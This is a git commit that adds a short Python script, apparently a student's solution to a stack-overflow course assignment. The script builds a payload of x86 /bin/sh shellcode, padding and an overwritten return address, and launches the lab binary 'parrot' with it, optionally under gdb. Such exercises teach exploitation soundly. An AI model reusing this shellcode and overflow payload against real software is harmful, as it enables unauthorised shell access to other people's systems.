984c9c1d72d9b9731d230cb7555ee1f11cf1365d
Ginger <cmollgaard@gmail.com>
2016-05-26 14:44:54 +0200

    assignment 4 added

---
+++ week4-stack/assignment/doit_parrot.py
@@ -0,0 +1,20 @@
+import os
+
+DEBUG = True
+exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
+		+ "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+exploit += "A"*(0x28-len(exploit))
+exploit += "\x3B"
+exploit += "A"*19
+exploit += "\x50\x85\x04\x08"
+
+
+if DEBUG:
+    argv = ["/usr/bin/gdb", "--args"]
+else:
+    argv = []
+
+argv += ["./parrot", exploit]
+
+os.execv(argv[0], argv)
